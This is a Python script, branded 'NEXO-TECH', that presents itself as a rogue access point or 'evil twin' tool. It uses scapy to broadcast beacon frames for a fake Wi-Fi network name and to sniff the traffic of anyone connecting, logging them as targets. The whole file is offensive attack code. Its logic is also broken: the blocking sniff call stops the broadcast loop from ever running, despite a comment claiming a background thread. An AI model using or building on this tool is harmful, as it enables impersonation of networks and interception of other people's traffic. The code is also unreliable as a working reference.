import os
import sys
import time
from scapy.all import *

# --- NEXO-TECH PRO COLORS ---
G, Y, C, R, W, B = '\033[92m', '\033[93m', '\033[96m', '\033[91m', '\033[0m', '\033[1m'

def show_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"{C}{B}")
    print("  _   _  _______   _____    _____ ______ _____ _    _ ")
    print(" | \ | | | ____\ \ / / _ \  |_   _|  ____/ ____| |  | |")
    print(" |  \| | | |__   \ V / | | |   | | |  __|| |    | |__| |")
    print(" | . ` | |  __|   > <| | | |   | | |  __|| |    |  __  |")
    print(" | |\  | | |____ / . \ |_| |  _| |_| |___| |____| |  | |")
    print(" |_| \_| |______/_/ \_\___/  |_____|______\_____|_|  |_|")
    print(f"{G}======================================================={W}")
    print(f"{Y}  CREATED BY:  {W}NEXO-TECH")
    print(f"{Y}  POWERED BY:  {W}DEMON ALEX & BLUEY & AGTSMOKY")
    print(f"{Y}  MODULE:      {R}ROGUE AP / EVIL TWIN ENGINE{W}")
    print(f"{G}======================================================={W}\n")

def packet_handler(pkt):
    # This function sniffs the traffic of anyone who connects
    if pkt.haslayer(IP):
        source_ip = pkt[IP].src
        dest_ip = pkt[IP].dst
        if pkt.haslayer(TCP):
            print(f"{R}[!] TARGET ALERT:{W} IP {G}{source_ip}{W} -> Accessing: {C}{dest_ip}{W}")

def start_rogue_ap(iface, ssid):
    # Crafting the Beacon Frame (The 'Signal')
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2='00:11:22:33:44:55', addr3='00:11:22:33:44:55')
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
    rsn = Dot11Elt(ID='RSNinfo', info=(
        '\x01\x00'                 # RSN Version 1
        '\x00\x0f\xac\x02'         # Group Cipher Suite: AES (CCMP)
        '\x02\x00'                 # 2 Pairwise Cipher Suites
        '\x00\x0f\xac\x04'         # Pairwise Cipher 1: AES (CCMP)
        '\x00\x0f\xac\x02'         # Pairwise Cipher 2: TKIP
        '\x01\x00'                 # 1 Authentication Key Management Suite
        '\x00\x0f\xac\x02'         # AKM Suite: PSK
        '\x00\x00'))               # RSN Capabilities (no extra)

    frame = RadioTap()/dot11/beacon/essid/rsn
    
    print(f"{C}[*] NEXO-ENGINE: {G}[ BROADCASTING ]{W}")
    print(f"{Y}[+] FAKE SSID:  {W}{ssid}")
    print(f"{Y}[+] INTERFACE:  {W}{iface}")
    print(f"{G}-------------------------------------------------------{W}")
    print(f"{C}[*] SNIFFER STATUS: {G}[ ACTIVE ]{W}")
    
    try:
        # Start sniffing in a background thread while broadcasting
        sniff(iface=iface, prn=packet_handler, store=0)
        while True:
            sendp(frame, iface=iface, inter=0.1, verbose=0)
    except KeyboardInterrupt:
        print(f"\n{R}[!] SHUTTING DOWN ROGUE AP...{W}")

if __name__ == "__main__":
    show_banner()
    
    interface = input(f"{Y}[+] Enter Monitor Interface (e.g. wlan0mon): {W}")
    wifi_name = input(f"{Y}[+] Enter Fake Wi-Fi Name (SSID): {W}")
    
    show_banner()
    start_rogue_ap(interface, wifi_name)
